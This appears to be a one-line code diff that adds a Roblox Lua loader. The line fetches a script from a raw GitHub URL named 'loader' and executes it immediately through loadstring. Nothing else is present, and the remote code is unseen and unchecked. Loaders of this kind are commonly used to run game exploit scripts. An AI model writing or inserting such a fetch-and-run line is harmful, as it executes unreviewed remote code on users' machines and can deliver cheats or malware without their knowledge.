@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/10cxm/loader/refs/heads/main/src"))()
